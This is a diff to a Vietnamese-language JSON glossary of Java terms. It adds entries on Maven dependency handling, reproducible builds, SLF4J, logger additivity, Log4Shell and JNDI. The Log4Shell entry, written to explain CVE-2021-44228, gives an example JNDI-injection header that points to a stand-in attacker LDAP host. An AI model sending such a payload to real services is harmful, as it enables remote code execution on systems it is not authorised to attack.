@@ -3053,7 +3053,7 @@
       "meaning": "Executable jar chứa cả code ứng dụng lẫn mọi thư viện. Fat jar của Spring Boot để các jar thư viện lồng trong `BOOT-INF/lib` và dùng launcher riêng để nạp chúng.",
       "example": "`java -jar app.jar` chạy `JarLauncher` trước, launcher mới gọi `main()` của ứng dụng.",
       "related": ["embedded-server", "spring-boot"],
-      "topics": ["spring-overview"]
+      "topics": ["spring-overview", "maven-gradle"]
     },
     {
       "id": "bom",
@@ -3061,7 +3061,7 @@
       "meaning": "Bill of Materials: một pom chỉ khai báo version cho một nhóm thư viện, để các thư viện đó luôn đi cùng nhau đúng phiên bản và dependency không phải ghi version.",
       "example": "Import `spring-boot-dependencies` rồi khai báo `jackson-databind` không cần `<version>`.",
       "related": ["spring-boot-starter"],
-      "topics": ["spring-overview"]
+      "topics": ["spring-overview", "maven-gradle"]
     },
     {
       "id": "application-context",
@@ -3669,7 +3669,7 @@
       "meaning": "Mapped Diagnostic Context: bảng key-value theo thread của thư viện log (SLF4J, Logback), tự gắn vào mọi dòng log của thread đó. Dựa trên `ThreadLocal` nên không tự sang thread khác.",
       "example": "`MDC.put(\"traceId\", id)` trong filter, pattern log có `%X{traceId}`.",
       "related": ["thread-local", "context-propagation"],
-      "topics": ["threadlocal", "production-logging"]
+      "topics": ["threadlocal", "production-logging", "java-logging"]
     },
     {
       "id": "inheritable-thread-local",
@@ -4229,7 +4229,7 @@
       "meaning": "Cơ chế của JDK nạp các cài đặt của một interface được khai báo trong `META-INF/services` (hoặc `provides` của module) trên classpath.",
       "example": "JDBC 4 dùng `ServiceLoader` để tự tìm driver PostgreSQL có trên classpath.",
       "related": ["factory-method"],
-      "topics": ["creational-patterns"]
+      "topics": ["creational-patterns", "java-logging"]
     },
     {
       "id": "spring-modulith",
@@ -7438,6 +7438,94 @@
       "example": "12,50 USD lưu thành `long` 1250 cent.",
       "related": ["bigdecimal-scale"],
       "topics": ["bigdecimal-money"]
+    },
+    {
+      "id": "transitive-dependency",
+      "term": "Transitive dependency",
+      "meaning": "Dependency trung gian: thư viện được kéo vào vì một dependency khác cần nó, không phải vì project khai báo trực tiếp.",
+      "example": "Khai báo `spring-boot-starter-web` kéo theo Jackson, Tomcat và hàng chục jar khác.",
+      "related": ["dependency-mediation", "bom"],
+      "topics": ["maven-gradle"]
+    },
+    {
+      "id": "dependency-mediation",
+      "term": "Dependency mediation",
+      "meaning": "Quy tắc chọn một phiên bản khi cây dependency yêu cầu nhiều bản của cùng thư viện: Maven chọn bản gần gốc nhất (hoà thì khai báo trước), Gradle chọn bản cao nhất.",
+      "example": "`money-util` 1.0 và 2.0 cùng độ sâu: Maven lấy bản của dependency khai báo trước.",
+      "related": ["transitive-dependency"],
+      "topics": ["maven-gradle"]
+    },
+    {
+      "id": "dependency-scope",
+      "term": "Dependency scope",
+      "meaning": "Phạm vi của dependency trong Maven: `compile`, `provided`, `runtime`, `test`, `import`; quyết định nó có mặt ở classpath biên dịch, chạy, test và có được đóng gói không.",
+      "example": "JDBC driver để `runtime`, JUnit để `test`, Servlet API cho Tomcat ngoài để `provided`.",
+      "related": ["transitive-dependency"],
+      "topics": ["maven-gradle"]
+    },
+    {
+      "id": "semantic-versioning",
+      "term": "Semantic versioning",
+      "meaning": "Quy ước phiên bản `MAJOR.MINOR.PATCH`: tăng MAJOR khi phá tương thích, MINOR khi thêm tính năng tương thích ngược, PATCH khi sửa lỗi.",
+      "example": "Đổi `setLocale(String)` thành `setLocale(Locale)` phải lên 2.0.0, không phải 1.7.0.",
+      "related": ["dependency-mediation"],
+      "topics": ["maven-gradle"]
+    },
+    {
+      "id": "snapshot-version",
+      "term": "SNAPSHOT",
+      "meaning": "Phiên bản Maven đang phát triển (`1.4-SNAPSHOT`), có thể bị ghi đè trên repository và được tải lại định kỳ, nên không dùng cho bản release.",
+      "example": "Build hôm nay và hôm qua cùng commit nhưng nhận hai bản `report-model:1.4-SNAPSHOT` khác nhau.",
+      "related": ["reproducible-build"],
+      "topics": ["maven-gradle"]
+    },
+    {
+      "id": "reproducible-build",
+      "term": "Reproducible build",
+      "meaning": "Build tái lập: cùng mã nguồn và cấu hình cho ra artifact giống hệt từng byte, nhờ cố định phiên bản dependency, plugin, công cụ và timestamp.",
+      "example": "Đặt `project.build.outputTimestamp` và cấm version range để hai lần build cùng commit cho cùng checksum.",
+      "related": ["snapshot-version", "semantic-versioning"],
+      "topics": ["maven-gradle"]
+    },
+    {
+      "id": "logging-facade",
+      "term": "Logging facade",
+      "meaning": "API logging trung gian mà code gọi, tách khỏi thư viện thật sự ghi log; backend được chọn lúc chạy theo classpath.",
+      "example": "Thư viện gọi SLF4J; ứng dụng dùng thư viện quyết định backend là Logback hay Log4j2.",
+      "related": ["slf4j"],
+      "topics": ["java-logging"]
+    },
+    {
+      "id": "slf4j",
+      "term": "SLF4J",
+      "meaning": "Simple Logging Facade for Java: facade logging phổ biến nhất. Bản 2.x tìm backend qua `ServiceLoader`; không có backend thì dùng NOP logger và bỏ mọi log.",
+      "example": "`private static final Logger log = LoggerFactory.getLogger(OrderService.class);`",
+      "related": ["logging-facade", "logger-additivity"],
+      "topics": ["java-logging"]
+    },
+    {
+      "id": "logger-additivity",
+      "term": "Additivity",
+      "meaning": "Thuộc tính của logger trong Logback/Log4j2: event được gửi tới appender của logger và mọi logger tổ tiên. Mặc định bật.",
+      "example": "Gắn cùng appender ở `com.shop.order` và root thì mỗi dòng log in hai lần; đặt `additivity=\"false\"` để chặn.",
+      "related": ["slf4j", "log-level"],
+      "topics": ["java-logging"]
+    },
+    {
+      "id": "log4shell",
+      "term": "Log4Shell",
+      "meaning": "Lỗ hổng CVE-2021-44228 của `log4j-core` 2.0-beta9 tới 2.14.1: lookup `${jndi:...}` trong message cho phép kẻ tấn công làm server tải và chạy code từ xa.",
+      "example": "Gửi header `User-Agent: ${jndi:ldap://attacker.example/a}` tới service ghi log header đó.",
+      "related": ["jndi"],
+      "topics": ["java-logging"]
+    },
+    {
+      "id": "jndi",
+      "term": "JNDI",
+      "meaning": "Java Naming and Directory Interface: API tra cứu object theo tên qua LDAP, RMI, DNS. Là đường mà Log4Shell dùng để tải object từ máy kẻ tấn công.",
+      "example": "App server cũ tra `DataSource` bằng `new InitialContext().lookup(\"java:comp/env/jdbc/orders\")`.",
+      "related": ["log4shell"],
+      "topics": ["java-logging"]
     }
   ]
 }
